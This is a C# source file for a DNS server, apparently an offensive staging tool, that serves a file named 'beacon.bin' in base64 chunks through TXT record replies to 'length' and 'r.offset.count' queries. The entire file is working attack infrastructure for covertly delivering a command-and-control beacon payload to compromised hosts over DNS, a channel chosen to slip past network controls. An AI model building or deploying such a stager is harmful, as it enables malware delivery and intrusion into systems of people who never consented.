using ARSoft.Tools.Net.Dns;
using System;
using System.IO;
using System.Linq;
using System.Net;

namespace SharpDNS
{
    class Program 
    {
        static Byte[] bytes;
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("SharpDNS.exe beacon.bin");
                return;
            }
            bytes = ReadBeacon(args[0]);

            using (DnsServer server = new DnsServer(IPAddress.Any, 10, 10, ProcessQuery))
            {
                // https://docs.ar-soft.de/arsoft.tools.net/DNS%20Server.html 
                server.Start();
                Console.WriteLine("Dns Server Start.");
                Console.ReadLine();
            }
        }

        static DnsMessageBase ProcessQuery(DnsMessageBase message, IPAddress clientAddress, System.Net.Sockets.ProtocolType protocol)
        {
            message.IsQuery = false;
            DnsMessage query = message as DnsMessage;

            string domain = query.Questions[0].Name;
            // length.dns.test.local
            // r.500.200.dns.test.local
            string[] sp = domain.Split('.');
            string command = sp[0];

            if (command.Equals("length"))
            {
                Console.WriteLine("Contains Length");

                query.AnswerRecords.Add(new TxtRecord(domain, 0, bytes.Length.ToString()));
                message.ReturnCode = ReturnCode.NoError;
                return message;
            }
            if (command.Equals("r"))
            {

                Console.WriteLine(domain);
                try
                {
                    int hasReceive = int.Parse(sp[1]);
                    int requireReceive = int.Parse(sp[2]);
                    Console.WriteLine("hasReceive length:{0},require reveive byte length:{1}", hasReceive, requireReceive);
                    Byte[] sendByte = bytes.Skip(hasReceive).Take(requireReceive).ToArray();
                    string sendString = Convert.ToBase64String(sendByte);
                    Console.WriteLine(sendString);
                    query.AnswerRecords.Add(new TxtRecord(domain, 0, sendString));
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
                message.ReturnCode = ReturnCode.NoError;
                return message;
            }
            message.ReturnCode = ReturnCode.Refused;
            return message;
        }
        static Byte[] ReadBeacon(string path)
        {
            Byte[] b = File.ReadAllBytes(path);
            Console.WriteLine("ReadBeacon File Length:{0}", b.Length);
            return b;
        }
    }
}